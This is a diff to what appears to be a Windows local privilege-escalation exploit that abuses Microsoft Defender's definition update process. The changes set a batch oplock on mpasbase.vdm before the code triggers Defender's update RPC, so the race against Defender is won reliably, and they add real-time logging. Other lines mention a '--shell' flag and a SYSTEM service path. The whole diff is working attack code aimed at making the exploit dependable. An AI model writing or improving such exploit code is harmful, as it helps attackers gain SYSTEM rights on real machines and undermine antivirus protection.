@@ -3106,6 +3106,7 @@ static bool ParseArgs(int argc, wchar_t* argv[], AppOptions& opt)
 
 int wmain(int argc, wchar_t* argv[])
 {
+	setvbuf(stdout, NULL, _IONBF, 0); // unbuffered — ensures log file is written in real-time
 
 	// Parse --shell flag early (needed by both SYSTEM service path and normal path)
 	for (int i = 1; i < argc; i++)
@@ -3393,11 +3394,44 @@ int wmain(int argc, wchar_t* argv[])
 				//printf("Unexpected error while opening current thread, error : %d", GetLastError());
 				goto cleanup;
 			}
+			// Fix: pre-set batch oplock on mpasbase.vdm BEFORE starting WDCallerThread.
+			// Race condition: WDCallerThread fires the RPC immediately; Defender reads and
+			// closes mpasbase.vdm before the oplock can be set, so GetOverlappedResult hangs
+			// forever. Setting the oplock first guarantees Defender hits it when it reads the file.
+			wcscpy(updatelibpath, L"\\??\\");
+			wcscat(updatelibpath, updatepath);
+			wcscat(updatelibpath, L"\\mpasbase.vdm");
+
+			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
+			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
+			if (ntstat)
+			{
+				LogV("Failed to open mpasbase.vdm for oplock, ntstatus : 0x%0.8X\n", ntstat);
+				goto cleanup;
+			}
+			LogV("Setting oplock on %ws (pre-update, eliminates race)\n", updatelibpath);
+
+			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
+
+			if (GetLastError() != ERROR_IO_PENDING)
+			{
+				LogV("Failed to set batch oplock, error : %d\n", GetLastError());
+				goto cleanup;
+			}
+			LogV("Oplock set. Triggering Defender update now.\n");
+
+			// NOW start WDCallerThread — oplock is guaranteed to be in place
 			threadargs.dirpath = updatepath;
 			threadargs.hntfythread = hcurrentthread;
 			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
 
+			// Wait for Defender to create the new GUID directory.
+			// Defender creates the dir BEFORE it opens mpasbase.vdm, so the oplock fires
+			// during or shortly after we break out of this loop.
 			LogV("Waiting for windows defender to create a new definition update directory...\n");
 			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
 			do {
@@ -3408,7 +3442,7 @@ int wmain(int argc, wchar_t* argv[])
 				HANDLE events[2] = { od.hEvent, threadargs.hevent };
 				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
 				{
-					//printf("ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
+					LogV("WDCallerThread returned unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
 					goto cleanup;
 				}
 				CloseHandle(od.hEvent);
@@ -3422,32 +3456,14 @@ int wmain(int argc, wchar_t* argv[])
 			} while (1);
 			LogV("Detected new definition update directory in %ws\n", newdefupdatedirname);
 
-			wcscpy(updatelibpath, L"\\??\\");
-			wcscat(updatelibpath, updatepath);
-			wcscat(updatelibpath, L"\\mpasbase.vdm");
-
-			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
-			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
-			if (ntstat)
+			// Oplock fires when Defender opens mpasbase.vdm (after GUID dir creation).
+			// HasOverlappedIoCompleted lets us skip the wait if it already fired.
+			if (!HasOverlappedIoCompleted(&ovd))
 			{
-				//printf("Failed to open update library, ntstatus : 0x%0.8X", ntstat);
-				goto cleanup;
+				LogV("Waiting for oplock to trigger...\n");
+				GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
 			}
-			LogV("Setting oplock on %ws\n", updatelibpath);
-
-			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
-
-			if (GetLastError() != ERROR_IO_PENDING)
-			{
-				//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
-				goto cleanup;
-			}
-			LogV("Waiting for oplock to trigger...\n");
-			GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
-			//printf("oplock triggered !\n");
+			LogV("Oplock triggered!\n");
 
 			//
 
